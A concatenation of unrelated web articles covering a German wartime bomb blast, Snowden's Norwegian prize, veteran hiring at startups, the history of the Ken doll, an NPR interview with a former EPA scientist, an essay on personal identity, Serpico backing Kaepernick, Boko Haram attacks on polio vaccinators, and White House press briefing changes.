"There was a huge blast wave. In the vicinity of the accident site and surrounding streets, home windows shattered and garage doors were pushed in," a police spokesman said.
“I had a feeling in my stomach that I wouldn't wish on anyone,” manager at a nearby supermarket Gerhard Nachbauer told the Westdeutsche Allgemeine Zeitung (WAZ). “The shop was evacuated within three minutes,” he said.
Business owner Victor da Silva, whose offices are 200 metres away from the blast site, told the paper that “our glass wall exploded before our eyes and roofs and streetlamps lamps fell over.”
The shock caused him to burst into tears, da Silva told the WAZ.
The ground below many Germany cities still contains unexploded bombs dropped by Allied and Soviet forces in the World War II, but most are safely defused when found.
Police have cordoned off the area and are surveying the damage.

The Norwegian branch of the PEN Club has invited Snowden to Oslo on November 18 to collect the Ossietzky prize, which celebrates "outstanding efforts for freedom of expression."
But the former US intelligence contractor-turned-whistleblower who has lived in Russia since making landmark disclosures on mass surveillance in 2013 faces charges in the US of theft of state secrets and espionage that carry up to 30 years in prison.
The Borgarting Court of Appeal said it could not rule on the Snowden petition asking for guarantees as there is no formal extradition request and Snowden is not in Norway. The decision mirrored arguments made by a lower court in June.
Norway's PEN Club said it would appeal.
"Sadly, this was not entirely unexpected," chairman William Nygaard of PEN Norway told the Reuters news agency. "We will of course appeal to the supreme court."
The Ossietzky Prize is named after German journalist and pacifist Carl von Ossietzky, who won the 1936 Nobel Peace Prize for disclosing Germany's rearmament in violation of the Treaty of Versailles. He was jailed by Nazi Germany for treason and unable to attend the award ceremony in Oslo 80 years ago.
Snowden won another Norwegian freedom of speech award - the Bjornson Prize - last year. He addressed that award ceremony via video link.
Snowden has also been nominated for the Nobel Peace Prize, also awarded in Norway, for a third straight year. This year's award will be announced on October 7.
Mixed feelings about Snowden in Europe
In 2014, opposition parties in Germany launched a legal bid to force the federal government to invite Snowden to Berlin to testify before a parliamentary committee on the NSA's surveillance program - including the US spy agency listening in on Chancellor Angela Merkel's phone conversations.
Although Snowden considered making the trip, in the end he decided against it because it was unclear whether he would be arrested or extradited to the United States. Merkel's ruling coalition had also voiced concerns that such an invitation could damage relations with Washington.
In October last year, the European Parliament passed a resolution calling on EU governments to protect Snowden from prosecution and extradition. However, as the resolution is non-binding, EU states are under no legal obligation to comply.

There are nearly one million unemployed military veterans in the U.S. according to the House Committee on Veteran's Affairs, and the Department of Labor reports that, for some veteran groups, unemployment is more than 20% higher than the national average. At the same time, Silicon Valley Bank reports that 90% of new startups will increase headcount this year, but that many of them can't find the workers they need to do so. How are our soldiers – individuals who've made extraordinary sacrifice and who've received some of the most sophisticated training and leadership experience available – not returning home to the job security and stability for which we've led them to believe they're fighting all along? And how are businesses still struggling to find good talent when it appears to be abundant?
As an American, I'm disheartened by the stats, but it's naïve to believe that we could fix the problem simply by plugging all the hiring holes with veterans – startups require specific talent, and vets often want the kind of stability that many startups couldn't offer. As a former soldier, however, I know part of the problem is due to employer misconception – when I transitioned back into the private sector, some companies actually told me that my experience was too military.
As an entrepreneur, therefore, I feel a sense of responsibility to be part of the solution, and I think that now, perhaps more than ever, startups are in a position to grow their ranks and simultaneously reduce veteran unemployment. And to prove that it's an accomplishable mission for companies – upstarts and established alike – I enlisted the help of LinkedIn, ID.me and Callaway Capital Management to understand the top reasons why these trendsetters hire vets.
Leadership readiness at every level
Working in an entrepreneurial environment is like working in professional sports or rock and roll. What matters most is not your age or tenure but rather the quality of your contribution, and often you must be prepared to inherit a leadership role at a young age. At 18 I was placed in charge of $5M worth of classified equipment. I have colleagues who in their 20s were appointed interim governors of entire towns in the Middle East. So it was no surprise when LinkedIn said the following about one of their own veterans, Ben Faw, who, along with fellow intern Tom Pae, spearheaded an initiative during InDay to give over 100 vets free LinkedIn profile makeovers:
"Even though we have more than 238 million members around the world, we still behave like a 3,779 person startups. Things move quickly here at LinkedIn, so we're always looking for talented professionals who are driven, nimble and collaborative… Ben's high level of involvement, even as an intern, in our recent July InDay project is a perfect example of the type of self-starting and entrepreneurial spirit that we look for in prospective team members." – Brendan Browne, director of global talent acquisition at LinkedIn
Composure and creativity under pressure
Working in a startup equates to operating under extreme pressure. Despite the rigidity of military regulations and the certainty provided by standard operating procedures, officers and enlisted soldiers alike are accustomed to making significant decisions in the face of moral dilemma, under the threat of physical harm and in a myriad of other uncertain situations. The ability to creatively solve problems in the face of unprecedented situations is a quality for which startup, ID.me, has found immense value:
“Startups have to be adaptive to market forces and outmaneuver competition. Veterans learned maneuver tactics the hard way, in unforgiving places like the mountains of Afghanistan or the deserts of Iraq. The talent they bring to ID.me has evolved our company from a military daily deal site, TroopSwap.com, to an identity solution that has the potential to serve as a model for the ecosystem of identity verification companies… Business has its stresses. But combat is a heck of a way to prove yourself capable of beating those challenges… The veterans we're cultivating today were forged in the fires of a long war, and actually volunteered to join that fight. That's pretty unique in our history. And we're just now seeing how good these men and women really are.” – Matthew Thompson, co-founder and COO at ID.me
Big picture understanding, relentless attention to detail
Minimum viable product within startup culture is based on the notion of providing just enough detail to serve the higher strategy, and the military phrase, “good enough for government work” is actually a suitable comparison here. In all seriousness, though, vets are trained to keep a watchful eye on the big picture, while maintaining an immaculate sense of detail. Such ability is incredibly rare and has been of particular importance to emerging markets investment company, Callaway Capital Management, which was quick to offer up Scott Quigley, yet another veteran intern, as an example of this talent:
“As a frontier market investment firm, we are constantly processing a wide range of data and research from around the world, often from environments in which the numbers can be less than reliable and difficult to use in a comparative context. To complicate matters, that information must be parsed for analysis by a range of individuals at the company – quants, economists and political risk analysts – each of whom possesses a different skill set and an often equally different style of communication. I hired Scott specifically because I knew his leadership experience as a captain in the U.S. Army would enable him to shepherd this process to create a seamless product and to do so on time, and, just as importantly, without alienating the occasionally competing personalities from whom those details came. Indeed military experience might be unique in equipping business leaders with this type of skill set.” – Daniel Freifeld, CEO and founder at Callaway Capital Management
The ultimate team player mentality
One of the first leadership tenets we learn in the military is that, to become a good leader, one must first be a good follower. In this sense, rising through the ranks is a rite of passage, which allows all military leaders to develop their own management styles based on the observation of their superiors – both good and bad – along the way. Working in any dynamic corporation requires a similar maturation-through-accumulation process, and often the most effective leaders are those who were able to mobilize their teams from the bottom of the chain of command, simply by setting the right example for others to follow:
"Ben's energy and enthusiasm for his veterans' project was palpable and contagious across the company. It's uplifting to see an intern like Ben, who's only been at LinkedIn for a few weeks, take initiative and lead a project that impacted so many veterans. Ben's work not only impacted the veterans that were helped that day; it also galvanized other LinkedIn employees who got a chance to interact with courageous vets, and LinkedIn members, who they might not have otherwise met." – Meg Garlinghouse, head of LinkedIn for Good at LinkedIn
Uncompromising integrity
Integrity is a necessary ingredient in relationships with employees, strategic partners, clients and investors, and it can singlehandedly build or destroy a company. It is also one of the most transferrable characteristics that veterans bring to the private sector:
“The Navy expects its sailors to "have the moral and mental strength to do what is right." The Air Force says "integrity first." In the Rangers, it was mission first, and always put others before yourself. Veterans understand loyalty and they understand integrity. You can trust them to do the right thing, even when no one else is watching.” – Matthew Thompson, co-founder and COO at ID.me
Habitual goal orientation
Veterans are accustomed not only to assessing situations and quickly formulating actionable plans, but also to performing After Action Reviews, which require all members of a team to identify areas in which a given strategy should be improved for next time. Startups call this process validated learning, and it's an integral component of continued forward momentum:
“When you're working in an unstructured environment, the ability to define clear goals and then work with a high degree of discipline and focus to accomplish those goals is paramount. It's an organizational leadership quality that my veteran hires consistently showcase, and it comes from a genuine understanding of both responsibility and accountability, as well as intimate experience in situations in which there is no clear precedent or path forward.” – Daniel Freifeld, CEO and founder at Callaway Capital Management
Will you follow suit?
Building a startup, or any organization for that matter, is like starting a revolution. As an entrepreneur you're convincing anyone you can – your employees, your clients, your partners and your family – that you're engaged in something worth fighting for. It's a grind. It's a battle. So who better to hire than a soldier?
More information on hiring veterans
The U.S. government wants American companies to help solve veteran unemployment, and in addition to launching initiatives like Joining Forces, Hiring Our Heroes and The Vow to Hire Heroes Act of 2011, it has made available several tax credits for hiring veterans.

Keeping Ken Ken News! "Ken®, He's a Doll!" This was the first introduction in 1961 we heard from Mattel about Ken®, the future steady boyfriend of Barbie®, the teenage fashion model. He was named after the son of Ruth and Elliot Handler; inventors of the Barbie® doll. In 1961 he stood a tall twelve inches high and came with a flocked crew cut in brunette or blonde (M#:750). He had a six-piece jointed body with painted blue eyes. He wore red bathing trunks, cork sandals and came with a yellow towel. Because his hair flock came off in water, Mattel re-released him the following year with molded, painted hair instead (M#: 750 BD: 1962). In 1963 he went through another metamorphous and was shortened by ¼ inch (M#: 750 BD: 1962). His legs became a little heftier and leg joints looser. Ken® brought to the world of Barbie® the possibility of adventure and romance. But, steady dating seems to be the result of this long lasting relationship. One sad note; Ken® is only considered an "accessory" to Barbie® by Mattel... making him the ultimate "boy toy". Ken® has garnered many images and scandal (Earring Magic Ken 1992); but to me he will always represent a healthy combination of innocence, boyish masculinity, playfulness and style. FUN FACT! Barbie® doll's full name is Barbara Millicent Roberts. Did you know that Ken® doll's full name is...Ken Carson? No middle name was ever given. ALLAN 1964-1965, Ken® doll's first friend. BRAD, 1969 is Ken® doll's first African American friend. TOMMY was introduced in 1996, and is Ken® doll's only family member in the Barbie® doll line.

The Real Ken®...Ken Handler
Even in 1959, little girls were asking for a boy doll. No boy doll had ever made it in the US. Very few retailers ordered Kens when they first came out in 1961, but consumers wanted all they could get. Initially, Ruth argued for a "bulge" in Ken's groin, but the design team said no. Ken and Barbie were the same in that respect (a social commentary today, but at the time, a simple marketing decision). So it was that Ruth's son, Ken, took a lot of teasing for his missing piece of plastic at school. Even as little Kenny went through puberty, Ken (the doll) got the bulge too.
By the time the doll came out, Barbara was in her late teens. She wasn't interested in dolls, and she wasn't interested in the attention. The ordeal was painful for her, especially with mom spending most of her time at the office. Barbara felt like a freak. She insisted on never being called "Barbie" again, so we don't. She has curly red-brunette hair, freckles, and a great smile. She married a man named Allan Segal when she was only 19. Ken married a nurse named Suzie. Neither Ken nor Barbara ever had a job. They were productive, interesting people. Barbara had a small boutique in Beverly Hills for a while, raised two children (Cheryl and Todd), got divorced, and has been going out with a very nice guy named Howard for a long time now. She plays a lot of golf, is an excellent golfer, and is on the board of Hillcrest Country Club. She has always been thin and in good shape. She has led the private life she wanted to lead, after having a mother who was more "Barbie's Mom" than her mom.
Barbara's daughter, Cheryl, has sold real estate and held a few jobs, but decided to go back to Pepperdine to get a law degree. She recently passed the California BAR exam. Her brother, Todd (there was a kid-doll named after him) now runs a Bed and Breakfast and organic farm in Massachusetts.
Ken Handler was, among many other things, gifted musician. Kenny played several instruments, was very well read, and pursued many endeavors. He often performed feats on the piano, but seldom for public audiences. He was, "A real gentleman. The kind of guy you found in the last century, not this one." In 1982, Ken and Suzie moved to Manhattan, where they lived on Central Park with their three kids. Ken wrote music and plays for his own pleasure. He enjoyed New York society. He loved life on the streets. In the mid-eighties, when rap music was just taking off, Ken wrote, directed, and produced a small film called "Delivery Boys", about the lives of several rappers. You can find it at specialty video stores.
Delivery Boys
Starring: Mario Van Peebles , Joss Marcano , Tom Sierchio and Jim Soriero . Directed by Ken Handler
A bizarre comedy about three pizza delivery boys who spend their off-hours competing in break dance contests. On the night of the final competition, they are waylaid by hookers, ex-Nazi doctors, and crazy sculptors.
A gang of boys under the Brooklyn Bridge are united by their common interest in break dancing. Some work as pizza delivery boys, hence they call themselves the "Delivery Boys". They form a dance team and enter a local break dance contest, sponsored by a woman's panty manufacturer. A rival gang's sponsor intimidates their employer into thinking she must keep the boys working so they won't be harmed. She gives the boys some "specialized" deliveries to make them late for the contest. The antics and calamities abound as the boys wrestle with her work assignments and getting to the contest on time.
Former EPA Scientist Weighs In On Fate Of Climate Science Under Trump
The relationship between the Trump administration and the Environmental Protection Agency is off to a rough start. The new administration has instructed officials to freeze its grants and contracts, external communication has been frozen, and academic papers by agency scientists may be subject to review before publication. NPR's Robert Siegel talks with Tracey Woodruff, a former senior scientist and policy advisor at the EPA under the Clinton and Bush administration, about whether previous transitions in administrations have always had been this rocky.
ROBERT SIEGEL, HOST:
We're now going to hear from another scientist who used to work for the federal government. Tracey Woodruff spent 13 years at the Environmental Protection Agency. She was a senior scientist and policy adviser starting in the Clinton administration, and she stayed through the George W. Bush administration. The focus of most of her research was air pollution. Dr. Woodruff, welcome to the program.
TRACEY WOODRUFF: Thank you.
SIEGEL: Earlier this week, the Trump transition team barred the EPA from communicating with the public - no blog posts, no social media postings, no press releases. That's been described as a temporary freeze, and it applies to scientific research papers, too.
You went through a transition from a Democratic administration to a Republican one. Is what you're hearing familiar, as par for the course or something unusual and different?
WOODRUFF: Well, I would say that actually during the transition between Clinton and Bush, there wasn't a general announcement that people should not put out scientific information, but we did actually experience some questioning about some work that we were doing related to children's health and the environment. And we actually got a lot of pushbacks from the White House about some information that we had been trying to publish.
So I don't think it's unusual that the administration might take a look and see what the scientists are doing at EPA, but I think the experience makes some of the scientists worried at EPA that they might see a return to that.
SIEGEL: I mean I think there's a difference between science and policy that's in some way related the science. I mean if you were asked to do a particular project, were you to say, no, that's a minefield; I don't want to do that; I know it's going to happen to it?
WOODRUFF: Yeah, that's a really good point because we have science, which is the pursuit of information, whereas public policy is really about taking the science we have at hand and then using it with the other factors that are important for making a decision. How do people feel about the decision? What are the costs and benefit? Who's going to be impacted? The policymaker should factor in those other factors in addition to the science when they make a decision.
But I think sometimes what ends up happening is science becomes a crutch in making decisions in terms of, well, we're going to wait until we have the absolute definitive proof from the science before we make a decision. The challenge with that for an agency like EPA is that, for example, in air pollution, people will be continued to be exposed to air pollution while we're waiting for more and more science to come in.
SIEGEL: As a former EPA scientist, are you pretty confident in the future of research at EPA, or are you concerned about its future?
WOODRUFF: I'm concerned. I think the statements about climate change being a hoax are concerning. Scientists around the world agree that climate change is important and that human activity is contributing to climate change. I know scientists who have been retiring or are thinking about retiring because they're worried about what's going to happen with their science or what's going to happen to them if they speak up about their science in the new administration.
SIEGEL: Given that you did research on air pollution - and I know your special interest. You're now at the University California, San Francisco OB-GYN department. You're interested in effects - environmental effects on prenatal and early life health. How significant was EPA's contribution to information in that field as opposed to, say, big university departments or other laboratories?
WOODRUFF: Oh, I think EPA's contribution to understanding the role the environment and health is critical. Actually some of the early studies that were done on the links between air pollution and mortality, which went to lead to a lot of the rule making that EPA has subsequently done, were done by EPA scientists.
And yet I think very few people think of EPA as an agency that's directly related to health. Not having EPA at the table in terms of talking about the science related to environment and health would be a big loss. And I think their contributions cannot be overestimated enough.
SIEGEL: That's Tracey Woodruff. She's a professor at the University of California, San Francisco. She was a senior EPA scientist and policy adviser under the Clinton and George W. Bush administrations. Tracey Woodruff, thank you for talking with us.
WOODRUFF: All right, thank you.

What does it take to be the same person over time? This question has vexed philosophers for millennia. If an individual's character changes enough, can this disrupt identity to such an extent that it no longer makes sense to say that we are dealing with the same person? That seems a reasonable conclusion to draw when the change is extreme. But I wanted to explore whether there might be more going on than this, and specifically whether the direction of change, not just the magnitude of change, might be a key factor.
In order to explore this question, I presented participants (Aeon readers who responded to a survey) with one of two different scenarios. The two scenarios expressed different versions of a classic thought experiment. They were based on the well-known story of Phineas Gage: a 19th-century railroad worker who had an unfortunate accident in which a tamping rod went right through his skull; he survived, but underwent a major character transformation as a result of brain damage – or so the story goes. Consider a vignette based on the myth of Gage:
Phineas is extremely kind; he really enjoys helping people. He is also employed as a railroad worker. One day at work, a railroad explosion causes a large iron spike to fly out and into his head, and he is immediately taken for emergency surgery. The doctors manage to remove the iron spike and their patient is fortunate to survive. However, in some ways this man after the accident is remarkably different from Phineas before the accident. Phineas before the accident was extremely kind and enjoyed helping people, but the man after the accident is now extremely cruel; he even enjoys harming people.
Gage's friends and family were inclined to regard the man after the accident as ‘no longer Gage'. This case study is often taken to show that some substantial changes of character can disrupt personal identity to the extent that it seems reasonable to say that this is a different person in an important sense. However, in this case, the accident involved not just a large change, but specifically a deterioration: the man after the accident is seen as worse than Gage before the accident. The typical interpretation of this case is that sufficient magnitude of character transformation disrupts identity. But might this other feature, the direction of change (‘improvement' or ‘deterioration') be partly responsible for judgments about identity?
To test this hypothesis, consider a replication of an X-phi (experimental philosophy) study. Aeon readers were invited to read either the ‘Deterioration Case' (the vignette printed above, based on the real Gage) or the following ‘Improvement Case,' in which a similarly sized change results in an improvement (differences in bold):
Phineas is extremely cruel; he really enjoys harming people. He is also employed as a railroad worker. One day at work, a railroad explosion causes a large iron spike to fly out and into his head, and he is immediately taken for emergency surgery. The doctors manage to remove the iron spike and their patient is fortunate to survive. However, in some ways this man after the accident is remarkably different from Phineas before the accident. Phineas before the accident was extremely cruel and enjoyed harming people, but the man after the accident is now extremely kind; he even enjoys helping people.
All participants rated whether they thought the (improved or deteriorated) man after the accident was still Gage. They rated this on a scale from 1 (still the same person) to 7 (not the same person); those who read the deterioration scenario rated on average 3.48, while those who read the improvement scenario rated on average 2.68. Those who read and rated the ‘Improvement Case' were more inclined to see the man after the accident as still Gage than those who read the scenario based on the classic ‘Deterioration Case'. This suggests that large changes do not always affect perceived personal identity in the same way: intuitions about personal identity can depend on the direction of change.
The same improvement/deterioration effect sheds light on another philosophical thought experiment: Derek Parfit's Russian Nobleman case. This is Parfit's original thought experiment (a ‘Deterioration Case'), from his book Reasons and Persons (1984):
In several years, a young Russian will inherit vast estates. Because he has socialist ideals, he intends, now, to give the land to the peasants. But he knows that in time his ideals may fade. To guard against this possibility, he does two things. He first signs a legal document, which will automatically give away the land, and which can be revoked only with his wife's consent. He then says to his wife: ‘Promise me that, if I ever change my mind, and ask you to revoke this document, you will not consent'. He adds: ‘I regard my ideals as essential to me. If I lose these ideals, I want you to think that I cease to exist. I want you to regard your husband then, not as me, the man who asks you for this promise, but only as his corrupted later self. Promise me that you would not do what he asks.'
Parfit suggests that some might think of the older Russian as a different person from the younger Russian, noting that:
if this man's wife made this promise, and he did in middle age ask her to revoke the document, she might plausibly regard herself as not released from her commitment. It might seem to her as if she has obligations to two different people. She might believe that to do what her husband now asks would be a betrayal of the young man whom she loved and married. And she might regard what her husband now says as unable to acquit her of disloyalty to this young man.
Parfit does not himself claim that the young and the old Russian are different persons, but this Russian Nobleman case is a seminal thought experiment suggesting that major dissimilarities can seem to disrupt personal identity. However, this judgment might also gain its force from a Phineas Gage effect, as the change described might be seen as not only a big change, but specifically a deterioration.
Another experiment tests the part played by direction of change in this scenario. Participants read either the original Russian Nobleman Case above (a ‘Deterioration Case'), or a slightly revised ‘Improvement Case' (differences in bold):
In several years, a young Russian will inherit vast estates. Because he has anti-socialist ideals, he intends, now, to not give the land to the peasants. But he knows that in time his ideals may fade. To guard against this possibility, he does two things. He first signs a legal document, which will automatically not give away the land, and which can be revoked only with his wife's consent. He then says to his wife: ‘Promise me that, if I ever change my mind, and ask you to revoke this document, you will not consent.' He adds: ‘I regard my ideals as essential to me. If I lose these ideals, I want you to think that I cease to exist. I want you to regard your husband then, not as me, the man who asks you for this promise, but only as his corrupted later self. Promise me that you would not do what he asks.'
Participants reading the Deterioration [Improvement] case were told about some changes that occur many years later:
Imagine this young man's wife made this promise so the land would [not] go to the peasants. But years later, her husband, now the old Russian, asks her to revoke the document, so as to [not] give the land to the peasants.
Compared with participants responding to Parfit's original (Deterioration) case, those responding to the revised (Improvement) case agreed more strongly that the old Russian was the same person as the young Russian, free to release his wife from her promise.
Positive-Kirk and Negative-Kirk are both dissimilar from the original, yet Positive-Kirk is the captain and Negative-Kirk is the impostor
Further evidence that direction of change affects identity can be seen in popular examples. Take, for example, ‘The Enemy Within' (1968), an episode of the original Star Trek television series. A transporter malfunction splits the ship's Captain Kirk into two people, one with the properties of his negative side, the other with the properties of his positive side. Positive-Kirk and Negative-Kirk are both dissimilar from the original captain, yet the ship's crew refers to Positive-Kirk as Captain Kirk and Negative-Kirk as the impostor. Improved Positive-Kirk is taken as identical and deteriorated Negative-Kirk as non-identical to the original.
Another example is found in the sci-fi novel Flowers for Algernon (1966) by Daniel Keyes. Charlie Gordon begins the story as mentally disabled. He enters surgery and, afterwards, the post-surgery patient is more intelligent. Some see this part of the story as an example of continuous personal identity despite radical change. However, eventually, the post-operative patient begins to deteriorate, resulting in a less intelligent individual. Unlike the identity-preserving improvement, this deterioration is cited as a personal death.
This example suggests the broader significance of the effect of direction of change on personal identity intuitions. These intuitive judgments can underlie a variety of more practical judgments about the self and personal identity. Extreme effects of mental disease or deterioration can seem to disrupt identity. But similarly large cognitive changes (eg, brought about through deep-brain stimulation) are often treated as obviously preserving personal identity, both when they restore previous cognitive functioning, and when they enhance it beyond previous capacities.
The experiments discussed so far indicate that direction of change affects intuitions about personal identity, but a crucial question remains about whether direction of change is really relevant to the actual personal identity relation. It might seem like extreme deteriorations disrupt personal identity, but is this simply an error of judgment?
There are noteworthy implications in either case. First, suppose direction of change is irrelevant to personal identity. In that case, the finding that direction of change impacts attributions of identity in these thought experiments reveals that such attributions are produced, in part, by an irrelevant factor. This gives a reason to doubt the status of these commonly experienced intuitions about seminal thought experiments – and also the status of other personal-identity intuitions driven by direction of change.
The old Nobleman cannot release his wife from her promise to the young Nobleman; yet his wife is still his wife
Philosophers have long used thought experiments to elicit intuitions about personal identity. Perhaps the most famous is John Locke's example of the prince and the cobbler. When imagining that a prince's mind were to enter a cobbler's body, most are inclined to regard the man with the cobbler's body and prince's mind to be the same person as the prince. Such thought experiments provide intuitive data, one source of evidence about the nature of personal identity. For example, from the prince and cobbler intuition, we infer the importance of psychological properties to personal identity. If it turns out that an irrelevant factor systematically skews our intuitions about certain cases, then we should be more skeptical about conclusions drawn from those thought experiments.
Now consider the alternative: suppose direction of change is relevant to personal identity. One challenge for this view is to make sense of some seemingly plausible ways in which the deteriorated individual still seems to be the same person as the earlier individual in the vignettes. For example, even if the post-accident man is no longer Gage, it does seem that he is still the son of pre-accident Gage's mother, that he owns the same house, and that he owes the same taxes. Perhaps someone who accepts that the post-accident man is not Gage would just reject these other judgments.
Alternatively, one might allow that certain relations or properties stand aside from personal identity. Perhaps (for example) the post-accident man is no longer the pre-accident Gage in some sense, but the pre- and post-accident Gage remain identical to each other in another sense relevant to tax obligations and property ownership. The old Nobleman might not be the young Nobleman in the sense that he cannot release his wife from her promise; yet he does appear to be identical to him in the sense that his wife is still his wife.
Whatever turns out to be the best solution to these puzzles of personal identity, the evidence from experimental philosophy so far indicates that direction of change plays a crucial role in judgments about whether we are dealing with the same person or not after the change. The surprising conclusion is that you can undergo a fundamental transformation of character and still be judged to be the same person, provided that the transformation is in the right direction.
Frank Serpico, a former New York City police officer who put his career and life on the line to expose rampant corruption in the NYPD, and was later immortalized in the 1973 film Serpico starring Al Pacino, today joined current members of the NYPD to show support for former San Francisco 49ers quarterback Colin Kaepernick.
According to the Associated Press, the 81-year-old Serpico said he's not a football fan, but believes Kaepernick is being unfairly blacklisted from the NFL for his political protest.
“He's trying to hold up this government, up to our founding fathers,” said Serpico.
The 29-year-old Kaepernick is currently unable to find work with an NFL team after drawing controversy last year when he refused to stand for the national anthem before games. Colin Kaepernick's refusal to stand was done as an act of protest against police violence and oppression against people of color in the United States, according to website of the NFL.
“I am not going to stand up to show pride in a flag for a country that oppresses black people and people of color,” Kaepernick said last August. “To me, this is bigger than football and it would be selfish on my part to look the other way. There are bodies in the street and people getting paid leave and getting away with murder.”
Serpico was joined by about 75 members of the NYPD, including Sgt. Edwin Raymond, who said he was there to support Colin Kaepernick as part of a desire for racial healing in the United States, according to ESPN.
“Until racism in America is no longer taboo, we own up to it, we admit it, we understand it and then we do what we have to do to solve it. Unfortunately, we're going to have these issues,” Raymond said.

Many people are upset with the NFL for what they see as the unfair treatment of Colin Kaepernick over his controversial political views. The NFL has, in the past, come under fire for being too lenient in punishing the bad behavior and law-breaking of its players, including numerous incidents of domestic violence, illegal dog fighting, and assault charges.
Kaepernick was merely standing up for what he believes and is now unable to find a position with an NFL team, prompting calls for boycotts against the NFL by people who believe Kaepernick is being punished for speaking his mind. According to the Sacramento Bee, the Atlanta NAACP is among the groups calling for a formal boycott against the NFL due to its treatment of Kaepernick.
Colin Kaepernick's future in professional football remains unclear. For Frank Serpico, and others, the NFL is making a big mistake by not letting Kaepernick on the field.

NINE female health workers shot dead in Nigeria as polio revenge attacks spread
Islamist militant group Boko Haram been blamed for carrying out attack
Witnesses said the gunmen arrived on three-wheel taxis
Further setback to efforts to eradicate polio in Nigeria
Religious clerics believe vaccines would sterilise children
Life-saving: A young child receives polio immunisation drops at a health post
Nine female polio vaccinators have been shot dead in two shootings in northern Nigeria.
Islamist militant group Boko Haram - a sect which has condemned the use of Western medicine - has been blamed for the attack.
In the first attack in Kano the polio vaccinators were shot dead by gunmen who drove up on a motor tricycle, reported the BBC.
Thirty minutes later gunmen targeted a clinic outside Kano city as the vaccinators prepared to start work.
Previously religious clerics had some of their followers stop receiving the vaccines saying that it would sterilise their children.
Boko Haram wants to impose Islamic law, or sharia, on a country of 160 million splits roughly equally between Christians and Muslims.
The group has carried out a spate of assaults on security forces in the city in recent weeks.
Force: Alleged members of the Nigerian Islamist group Boko Haram - the group wants to impose Islamic law, or sharia, on a country of 160 million splits roughly equally between Christians and Muslims
THE GROWING THREAT OF POLIO Despite The World Health Organisation's international vaccination programme, the disease has never been eradicated and continues to attack children in Pakistan, Nigeria and Afghnaistan. The numbers fell from 173 in 2011 to 53 in 2012 according to the Global Polio Eradication Initiative.
It has also re-appeared in Nigeria because of malicious rumours that the Western-donated vaccine is harmful, while a renewed threat to Europe has emerged from with eastern side of the continent.
It is caused by a virus which attacks nerve cells in the brain and spinal cord. It is spread via human faeces and leads to muscle weakness and painful spasms, followed by paralysis and sometimes death when the lungs are affected.
Post-polio syndrome is believed to affect at least eight out of ten of the survivors. Although the syndrome was first described by doctors in the Eighties, the scale of the problem is only just emerging, as more polio survivors live long enough to develop it.
Polio has not been reported in Britain since the mid-Sixties, but there are a number of celebrity survivors, including actors Mia Farrow and Donald Sutherland, film director Francis Ford Coppola, celebrity academic David Starkey, and singers Judy Collins and Neil Young.
Today's attack will be a further setback to efforts by global health organisations to eradicate polio in Nigeria, one of only three countries, along with Pakistan and Afghanistan, where the disease remains endemic.
In December gunmen in Pakistan shot dead aid workers running a U.N.-backed polio vaccination campaign.
The killings were a major setback for a campaign that international health officials consider vital to contain the crippling disease but which Taliban insurgents say is a cover for espionage.
Suspicion over the programme followed reports in 2011 that the CIA plotted a fake vaccination programme in Pakistan to snare Osama bin Laden's DNA.
Agents had reportedly started the vaccine drive against hepatitis B in Abbottabad, where they believed the Al Qaeda leader was hiding out just before he was killed, according to Pakistan officials and local residents.
In a radio interview this month, Reince Priebus, the incoming White House chief of staff, suggested that traditions including the daily televised press briefings and seating assignments could change.

“I think it's time to revisit a lot of these things that have been done in the White House, and I can assure you that change is going to happen, even on things that might seem boring like this topic,” he told the radio host Hugh Hewitt.
Mr. Spicer, in an interview with Fox News on Thursday night, said the new regime wanted to be “innovative, entrepreneurial” about its media operations. While he said he believed there would be daily briefings, he suggested the format could change, perhaps by adding new elements, eliminating some television coverage and bringing “more people into the process.”
All this has stirred concern among journalists who say seemingly small changes to the system could lead to the diminishing of other traditions.
“Beginning to suggest the daily briefings shouldn't happen every day in the format that they are, I think, begins to establish a slippery slope,” said Scott Wilson, the national editor for The Washington Post, who was a White House correspondent during the Obama presidency. “There is value in having a formal setting where the administration's position is stated and can be referred to and can be archived.”
Since his election, Mr. Trump has shown few reservations about ignoring the norms of presidential media coverage. He has defied convention by refusing to allow journalists to travel with him on his plane — including on his flight to the White House for his first meeting with President Obama.
In a highly publicized incident in mid-November, he left Trump Tower for dinner with his family without telling the reporters assigned to cover his whereabouts, sending the reporters scrambling for information. And while Mr. Trump has granted some interviews, including with The New York Times and The Wall Street Journal, he also has not held a news conference since late July, preferring instead to use Twitter as his megaphone.
The protocols that underpin the relationship between the news media and the president might seem arcane to many Americans. But press advocates say these traditions, even in the age of Twitter, ensure fundamental tenets of democracy: historical record and access to information.
“The American people deserve to have someone stand up and be accountable for the work of the president and the White House every day,” said Mike McCurry, who served as press secretary for President Bill Clinton in the mid-1990s. “I think any White House needs to explain its position and reasoning in more than 140 characters.”

Many journalists also said that the new administration should retain the so-called protective pool — a group of journalists that travels with the president whenever he goes outside the White House, and through which he can communicate with the public during an emergency or crisis.
“We're not asking to be at his dinner table with him,” said Jeff Mason, the president of the White House Correspondents' Association, which coordinates the pool. “We just want to be nearby in case something happens.”
Veteran journalists point to the presence of a pool reporter with President George W. Bush on Sept. 11, 2001, as an example of providing a witness to history in a matter of urgent national interest. The pool's presence ensures timely reporting on the president's activities and essentially “protects” the ability to deliver coverage should something unexpected occur.
But there is acknowledgment on both sides of the lectern that some re-examination of the system is warranted, especially at a time when news organizations, which must pay their way to follow the president, are increasingly hamstrung by budget constraints.
“The question really should be, why do you need a protective pool when everybody has cellphones?” said Marlin Fitzwater, who was the press secretary under Presidents Ronald Reagan and George Bush. “When you have a president who can operate a tweet and reach 28 million people from the driveway of any building in America, you don't really need 14 people sitting there and watching him all night long.” (Mr. Trump's Twitter account, @realDonaldTrump, has about 18 million followers.)
Mr. Mason said that, since the election, the correspondents' association and Mr. Trump's team had “made a lot of progress in forming a protective pool” and that he was confident Mr. Trump would allow reporters to accompany him on Air Force One once he became president.
Mr. Trump's team has floated the possibility of other changes as well. In his radio interview, Mr. Priebus hinted that the Trump administration might assume control of the seating assignments in the briefing room. The correspondents' association has decided seating assignments since 1981, in large part because administrations of both parties did not want even the appearance of favoritism in determining press access.
Mr. Priebus's remarks prompted concern that the new administration would try to usurp some of the association's control.

Still, many said some kind of seating reform was appropriate.
Mr. McCurry and Ari Fleischer, who served as press secretary under George W. Bush, said they had discussed a setup that would allow a revolving group of journalists into the briefing room rather than reserving seats only for the existing White House press corps. Foreign journalists could attend on Wednesdays, for example, while alternative online media outlets such as Breitbart News and Think Progress could rotate in on Thursdays.
